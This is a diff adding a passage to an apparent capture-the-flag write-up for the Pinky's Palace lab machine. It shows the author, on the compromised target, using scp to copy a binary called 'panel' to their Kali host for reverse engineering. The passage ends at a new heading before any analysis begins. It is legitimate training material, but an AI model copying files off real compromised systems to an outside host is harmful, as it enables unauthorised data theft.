@@ -912,3 +912,21 @@ drwxr-x---  2 demon demon  4096 Mar 17 19:48 .
 drwxr-xr-x 25 root  root   4096 Mar 17 19:31 ..
 -rwxr-x---  1 demon demon 13280 Mar 17 19:48 panel
 ```
+
+I will likely need to do some reverse engineering on this panel file, so I will SCP to transfer this file to my Kali box for further disection.
+```
+demon@Pinkys-Palace:/daemon$ scp ./panel root@192.168.225.129:~/panel
+scp ./panel root@192.168.225.129:~/panel
+The authenticity of host '192.168.225.129 (192.168.225.129)' can't be established.
+ECDSA key fingerprint is SHA256:znMLiEnEPPazyk0skENbcmsYYpTdlkf1zbix/qJysiY.
+Are you sure you want to continue connecting (yes/no)? yes
+yes
+Warning: Permanently added '192.168.225.129' (ECDSA) to the list of known hosts.
+root@192.168.225.129's password: <HEY NO PEEKING YOU NOSEY BASTARD!!!>
+
+panel                                         100%   13KB   9.1MB/s   00:00    
+demon@Pinkys-Palace:/daemon$ 
+```
+
+## Reverse Engineering of the Demon's panel
+
